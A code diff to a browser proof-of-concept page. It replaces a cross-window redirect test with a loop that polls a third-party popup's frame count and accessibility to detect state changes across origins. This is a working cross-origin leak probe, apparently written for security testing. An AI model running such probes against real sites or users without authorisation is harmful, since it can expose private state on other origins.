@@ -85,21 +85,77 @@
                 return;
             }
 
-            setTimeout(() => {
-                try {
-                    // Navigate the target window back to this PoC
-                    victimWindow.location.href = successUrl;
-                    
-                    statusDiv.style.backgroundColor = "#e6fffa";
-                    statusDiv.style.color = "#2ea44f";
-                    statusDiv.innerText = "Redirect command sent! Observe the opened window.";
-                } catch (e) {
-                    statusDiv.style.backgroundColor = "#fff0f0";
-                    statusDiv.style.color = "#d93025";
-                    statusDiv.innerText = "Blocked: The browser prevented the cross-origin redirect (Target is likely SECURE).";
-                    console.error("Navigation Blocked:", e);
-                }
-            }, 3000);
+            // Step 1: let the popup settle a bit
+let initialFrames = null;
+let monitoringStarted = false;
+let monitorStopped = false;
+
+setTimeout(() => {
+    if (!victimWindow || victimWindow.closed) {
+        statusDiv.style.backgroundColor = "#fff0f0";
+        statusDiv.style.color = "#d93025";
+        statusDiv.innerText = "Popup closed before monitoring began.";
+        return;
+    }
+
+    try {
+        initialFrames = victimWindow.frames.length;
+        statusDiv.style.backgroundColor = "#e8f0fe";
+        statusDiv.style.color = "#1a73e8";
+        statusDiv.innerText = "Baseline captured. Monitoring for popup state changes...";
+    } catch (e) {
+        statusDiv.style.backgroundColor = "#fff8e1";
+        statusDiv.style.color = "#8a6d3b";
+        statusDiv.innerText = "Baseline not readable. Monitoring for access changes...";
+    }
+
+    monitoringStarted = true;
+}, 3000);
+
+// Step 2: poll for visible state changes
+const check = setInterval(() => {
+    if (monitorStopped) {
+        clearInterval(check);
+        return;
+    }
+
+    if (!victimWindow || victimWindow.closed) {
+        monitorStopped = true;
+        clearInterval(check);
+        statusDiv.style.backgroundColor = "#fff0f0";
+        statusDiv.style.color = "#d93025";
+        statusDiv.innerText = "Popup was closed.";
+        return;
+    }
+
+    if (!monitoringStarted) {
+        return;
+    }
+
+    try {
+        const currentFrames = victimWindow.frames.length;
+
+        if (initialFrames !== null && currentFrames !== initialFrames) {
+            monitorStopped = true;
+            clearInterval(check);
+            statusDiv.style.backgroundColor = "#fff8e1";
+            statusDiv.style.color = "#8a6d3b";
+            statusDiv.innerText = "Observed state change: frame count changed.";
+            return;
+        }
+
+        statusDiv.style.backgroundColor = "#e8f0fe";
+        statusDiv.style.color = "#1a73e8";
+        statusDiv.innerText = "Monitoring... no observable change yet.";
+    } catch (e) {
+        monitorStopped = true;
+        clearInterval(check);
+        statusDiv.style.backgroundColor = "#fff8e1";
+        statusDiv.style.color = "#8a6d3b";
+        statusDiv.innerText = "Observed state change: popup became cross-origin/inaccessible.";
+        console.log("Access changed:", e);
+    }
+}, 400);
         }
     </script>
 </body>
